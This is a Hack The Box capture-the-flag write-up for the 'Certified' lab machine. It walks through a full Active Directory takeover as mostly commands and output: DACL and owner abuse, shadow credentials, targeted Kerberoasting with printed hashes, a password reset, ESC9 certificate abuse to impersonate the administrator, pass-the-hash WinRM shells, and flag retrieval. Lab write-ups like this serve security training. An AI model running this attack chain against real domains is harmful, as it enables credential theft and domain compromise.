---
tags:
title: Certified - Medium (HTB)
permalink: /Certified-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

# Reconocimiento

As is common in `Windows` pentests, you will start the `Certified` box with credentials for the following account: Username: `judith.mader` Password: `judith09`

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49693,49722,49731 10.129.231.186
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 22:41 -03
Nmap scan report for 10.129.231.186
Host is up (0.67s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-05 08:43:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-05T08:44:53+00:00; +7h01m48s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-12-05T08:44:52+00:00; +7h01m48s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-12-05T08:44:55+00:00; +7h01m49s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-12-05T08:44:52+00:00; +7h01m49s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49731/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-12-05T08:44:15
|_  start_date: N/A
|_clock-skew: mean: 7h01m48s, deviation: 0s, median: 7h01m48s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.77 seconds
```

## RPC / Port 135 

Usando las credenciales iniciales me conecte al servicio `RPC` y enumere usuarios validos del dominio.

```bash
rpcclient -U "judith.mader%judith09" 10.129.231.186   
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[judith.mader] rid:[0x44f]
user:[management_svc] rid:[0x451]
user:[ca_operator] rid:[0x452]
user:[alexander.huges] rid:[0x641]
user:[harry.wilson] rid:[0x642]
user:[gregory.cameron] rid:[0x643]
```

Y con el siguiente comando limpie lo que no quiero para solo quedarme con los nombres y asi meterlos al archivo `users`.

```bash
cat users | tr '[]' ' ' | awk '{print $2}' | sponge users
```

```bash
impacket-GetUserSPNs certified.htb/judith.mader:judith09 -usersfile users -dc-ip 10.129.231.186 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
                                                                                                                                                                                           
┌──(root㉿zsln)-[/home/…/Desktop/zsln/htb/certified]
└─# ntpdate -b 10.129.231.186
2025-12-05 05:50:10.002410 (-0300) +25309.202020 +/- 0.175049 10.129.231.186 s1 no-leap
CLOCK: time stepped by 25309.202020
	
```

```bash
impacket-getTGT certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in judith.mader.ccache
```

```bash
rusthound -d certified.htb -u 'judith.mader' -p 'judith09'
---------------------------------------------------
Initializing RustHound at 06:03:47 on 12/05/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-12-05T09:03:47Z INFO  rusthound] Verbosity level: Info
[2025-12-05T09:03:48Z INFO  rusthound::ldap] Connected to CERTIFIED.HTB Active Directory!
[2025-12-05T09:03:48Z INFO  rusthound::ldap] Starting data collection...
[2025-12-05T09:03:55Z INFO  rusthound::ldap] All data collected for NamingContext DC=certified,DC=htb
[2025-12-05T09:03:55Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2025-12-05T09:03:55Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[2025-12-05T09:03:55Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2025-12-05T09:03:55Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2025-12-05T09:03:55Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 10 users parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_users.json created!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 61 groups parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_groups.json created!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 1 computers parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_computers.json created!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 1 ous parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_ous.json created!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_domains.json created!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 2 gpos parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_gpos.json created!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 21 containers parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_containers.json created!

RustHound Enumeration Completed at 06:03:55 on 12/05/25! Happy Graphing!
```

![image-center](/assets/images/{F04C09A4-A49F-4158-A627-84135CCC9B72}.png)
```bash
impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' certified.htb/judith.mader:judith09
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!

```

```bash
 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09' 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20251205-062356.bak
[*] DACL modified successfully!
                                 
```

```bash
bloodyAD -u judith.mader -p judith09 -d certified.htb --dc-ip 10.129.231.186 add groupMember MANAGEMENT judith.mader                                                          
[+] judith.mader added to MANAGEMENT
```

![image-center](/assets/images/{9911527C-3A5E-4246-9A66-3F935E5346CF}.png)

```bash
python3 pywhisker.py -d certified.htb -u judith.mader -p judith09 --target management_svc --action 'add'
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 1583f68f-21c4-dcf8-03cc-fe4a6aa84b0f
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: Lv8O9ZXC.pfx
[+] PFX exportiert nach: Lv8O9ZXC.pfx
[i] Passwort für PFX: 2VsMAPy6VysBmYVNpJ4K
[+] Saved PFX (#PKCS12) certificate & key at path: Lv8O9ZXC.pfx
[*] Must be used with password: 2VsMAPy6VysBmYVNpJ4K
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

```bash
certipy-ad auth -pfx Lv8O9ZXC.pfx -dc-ip 10.129.231.186 -password 2VsMAPy6VysBmYVNpJ4K -username management_svc -domain certified.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

/usr/lib/python3/dist-packages/certipy/lib/certificate.py:662: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return pkcs12.load_key_and_certificates(pfx, password)[:-1]
[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Got hash for 'management_svc@certified.htb': aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
```

![image-center](/assets/images/{02F50B9C-0520-4891-9CCC-DC382C09593F}.png)

```bash
└─# impacket-getTGT certified.htb/management_svc -no-pass -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in management_svc.ccache
                                                                                                                                                                                           
┌──(root㉿zsln)-[/home/…/htb/certified/pywhisker/pywhisker]
└─# export KRB5CCNAME=management_svc.ccache                                                                              
          
```

```bash 
python3 targetedKerberoast.py -v -d certified.htb -u management_svc -k  
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (management_svc)
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$a50334ad8cfb12fb11e3ce417fc9493c$0aeebffb88143dd117ac6f40c423c71c5f80faf5ed779a5a3dbca32a2fc96e552816fba3084be5a5f3472780741faaaa423d0e515ce5485075781b6700941e8c74d38b2832c91c571f35df2d7ae2f57f1dc75759203fa237fa1630e7a59e5cda496970eaba42f546db40eda013ac12cf3e54322f870c207cbaad2d3e90b475b6bbeddabfc4ddea792d1045635d73b21173bfe847a27d84affabf1defe90e2fc784850c8e2050e7457c8e2c89823dea7241be8768680a7f665fab993c70db0bce2e040a6145f3fe7abe67703a566bed7ad7053782da3384dfef76fbb068124f3d2a988686156812a617e85651daafa98ecd19fc54e2897419246a64295856ae2b9bf7ae7117977d1d33c29e9ebd5b6764a5e7453ceb50bae7678b95a05b24ed710f62ee2620da8e1ee025a10c1f593741a9c7adb83604e36ae44ce325caee778f66a9699143282fa422913640a80c9383fff4de7640f82b4aeab8c8f6ebbe26ca63bf21fe09176a9449563ce19f5586a655a15d5877c393c816a1dafcef58ce558862eafafcd390af4d69dd004e8cf1a834ee9191e467cad5a5f770f0b70821419a1b5c419851e80e5e27eb49c0c392fd3cce1a5f07a13aab5270e26a142653d63744104ef8c0ac10c3e39596a0995f52bb7762a3ad17e269aa4a61fc7fe8c1267b700f35b780ae13ee88ab1297097eb80f8921f7afad9cdca07ff9c43a2205398ff86a5ff3ce9614a2acb1e3f9196972a27da47c364e0fcc5414323b075dfbb5b2376f4c148caa20a690d02a06c639a77ffb141ed0968907893f54e89b7e03b34e8c8c1e97adacb4f1ce0d2cc5399d2bb134e4c5cf563f48b5fff53745921de38503cdc62f063b2dee8bbd8dfcffe0013bc14508db839b48360ea7deb33b1f9f456da43acbec0d2ed08c30e9238233a505e5ceea2b122e9354a7fd3fe23f19fde29aa7a154bb19f40e2841b456e8bf424f9ea71fa696f1078d60bdbf0bff63517eba359e3cf0ce03f3d65edbbbd4411c9470495a633a70dafb5f602a33bd47c70e22d6a5f16451c1304ebff2a59b7b50e8c2bc40e5b17cc75f8808848ab8d93aac513e9fe19c1f86f08c6378551f519468af3ad3bb92b2410ee7ea0b59eef23da970d6c71ddc547cadc8edd78fc80174190f9c4884d9c92aebe82b024dbdd7afe9f32aed7ab51ca5f07b114213409fdfab32e3063e32992e697f26726d86d6101994e336dfc8509c4c7fee27a6823a0726b9e182a54f676ff65a62fa280f21d5425bce05de12394b114e82a65d41fe26c1c4c81d6aaa6a588891e5230db58e587a0e4c523a385bfa2289ba49171cd9aa0b8a9ee760b85736c078c9722e32ff4a7d1700db1b8ea03ba1cc0c5d9aab04256525d30862144bcd99d78da507857cd9987d79b985bd21223ba4116663ce5890447a93d4bdeb4378dcf1658d78dcfda25a35e6eda84841365000cd61174837b9cee40b763e6e226075db3da82672c8f406721c4407e87c07df89ad641e0bcfe150cf4e061d6bf194e9e090373535820d7ab9ae8f3d8b1bb57af17b3fa6663e4d931fdff383f8761e987ff1433da78a5f6a9110b73cb6b777e23463e4a8fa4d7ebc0fc7a6d602ad7474f8f0ef
[VERBOSE] SPN added successfully for (ca_operator)
[+] Printing hash for (ca_operator)
$krb5tgs$23$*ca_operator$CERTIFIED.HTB$certified.htb/ca_operator*$bc7addabda7cc36c9aaa6ca3d68c2758$33cf4f2bc54674c3dacec50d2e21e563f5f901142bdcf06aca684278fdbe8170356389655661314417bbc3f9203d1797d134e3bea2751f8617424288fcd253839e1df0afda844210e3e14dd2c3427e9891b678279ddb84cb64684e5b455789e13f0cf42bf7f1440ef29e0d9742901030a5ef2678d74d821943a9dce92509087640e0069c441face6130b01187efbeb8e34a3b394ddae4e6e6004f3b4ed97c6d826735a2f981216c4f900e2ebbc4bdd84daccb1e4b4aa7c094c938c68c08ef980e8627820732e60101ed54ed0b56aedb1e30b3b5f9872fc6b486d43efd305e107a227192ee80717cec8036f5d028356571e874465a6e22cca9c2c9efe5633a79d4da2fa8e4698b95526f469fb74743a06571ffe3498427eb0be8dca43bace93c6d0589c4e5512ceb4d5f749a1b7b9885a4560bf125dae88b8e58ee9305c2d4c943467aa2b25737c193c7f5175b8fb96cdba699cd4591c190f8260d2bb221b279a88ed887b469463087883f8e9a6c1d810aee3e2848e87c2c23b5ae2a5d266c2e4cd058bba8fed46a3441b099841ddbe959aae1db179d0401fe548d2b83e535bf204cecfe7689ec592e34d6c6d59333a04fdcdf1fbabf2e94ff02a0dc763f1100857554ad2f11299168fdd452c7c2199c25495214a2ada96c8614b1566d65c72e83d1746293d3f78204b71918c25a2a477de6ee01df37a3846695d695bac96db5575a09f1440e44288720f6f1af65fabb1c6c98b3c671e8bd3d184b7c0763737550df13e95d7db995098090dd7f65e819e3abeadb0b75ecb2db7c18a103e7f8e3310da868151393932f077b4c40979978badac3c51d345d52ed7eacd61616f1a4931635196bc6e466328535626e5641e03568b01e22d19d567edbb9ae3d70d001309e61444587b02faba9953a0616945421777061d43d175b86157790e30d1e9b04ae1eaf720a0019144ad834135e130f501b33ab08516fe5c04a19393aed5f262bc49ce2a7ea97560aac6dd1cd7769386caf1cf1f955913f5321294c2eacaa37c42dfcad6f8e07407a7e9619eb09f4f08d1c04f8ef6e15cfcfe3acba0f9ffdbe5ca623128812dcf6dad7c21f944106441c73fc5abbb2f3b06cdbb93fd64c54e45f12e091659eee1e10c8cd5f6e988a9f358cac334dc55c31bc28ecfe90b1446304de0effc8f3939b5904c157ef7be2dfcd35b00e55342ef52b54ea4048ecc297ca064974b2cd23f7220367fdc8747e1296caca5924c5bd612e2706c92b886d939908e3c0150509b2b9f0172ae29d46f9c3145fae918ac94662a749d260bf76997e7dc14d1b66d860c5244eac735d305933e228ad669b376d53c48bfe1942baea18183719af166550217b641698a63249dff54cf8beea154bca74347fe3c8749cdf8308c349daa81a306514e84ea7c6efd29d257e8b35bf06799812f0f5eba1f97d08d7a96a3b2930ecc10baa6516ed704d337c286da44d0c3d129ccdcb68628659b47d591c38b65d7ef1b39765f765e448b779d1aa0f5c60884899ebfba36fdd44617750ac8c1d0a9f47a347ad6c26c9981bc085b00ddf3eb236d56e6c5be8693c6a552530de6bfed9215613ffc31255a744cb1dc35373d4160cc73c6
[VERBOSE] SPN removed successfully for (ca_operator)

```

```powershell
evil-winrm -i certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
/var/lib/gems/3.3.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...
*Evil-WinRM* PS C:\Users\management_svc\Documents> cat ../desktop/user.txt
836ae38953503153ca864adfde215ebe
```

```bash
certipy-ad find -u management_svc -hashes 'aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.231.186 -dc-host dc01.certified.htb -vulnerable -target certified.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20251205064057_Certipy.txt'
[*] Wrote text output to '20251205064057_Certipy.txt'
[*] Saving JSON output to '20251205064057_Certipy.json'
[*] Wrote JSON output to '20251205064057_Certipy.json'
	
```

```bash
pth-net rpc password "ca_operator" "newP@ssword2022" -U "certified.htb"/"management_svc"%"ffffffffffffffffffffffffffffffff":"a091c1832bcdd4677c28b5a6a1295584" -S "10.129.231.186"
```

```bash
certipy-ad find -u ca_operator@certified.htb -p 'newP@ssword2022' -dc-ip 10.129.231.186 -enabled -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-05-13T15:48:52+00:00
    Template Last Modified              : 2024-05-13T15:55:20+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Full Control Principals         : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.

```

```bash
certipy-ad  account -u 'ca_operator@certified.htb' -p 'newP@ssword2022' -dc-ip '10.129.231.186' -user 'administrator' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=certified,DC=htb
    name                                : Administrator
    objectSid                           : S-1-5-21-729746778-2675978091-3820388244-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 66048
    whenCreated                         : 2024-05-13T15:02:18+00:00
    whenChanged                         : 2025-12-05T08:41:31+00:00

```

```bash
 certipy-ad  account -u 'management_svc@certified.htb' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -dc-ip '10.129.231.186' -upn 'administrator' -user 'ca_operator' update 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'

```

```bash
certipy-ad req -u ca_operator -p newP@ssword2022 -ca certified-DC01-CA -template CertifiedAuthentication  -dc-ip '10.129.231.186'                  
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```bash
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.231.186 -u ca_operator -domain certified.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[!] The provided username does not match the identity found in the certificate: 'ca_operator' - 'administrator'
Do you want to continue? (Y/n): t
[*] Using principal: 'ca_operator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_operator.ccache'
[*] Wrote credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Got hash for 'ca_operator@certified.htb': aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45

```

```bash
(root㉿zsln)-[/home/…/Desktop/zsln/htb/certified]
└─# certipy-ad  account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.254.76 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
                                                                                                                                                                                           
┌──(root㉿zsln)-[/home/…/Desktop/zsln/htb/certified]
└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.254.76 -domain certified.htb                                                                           
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34

```

```powershell
evil-winrm -i certified.htb -u administrator -H '0d5b49608bbce1751f708748f67e2d34'                                   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
b7ae47d3ac0f7893ec986fd237f7e5c9
```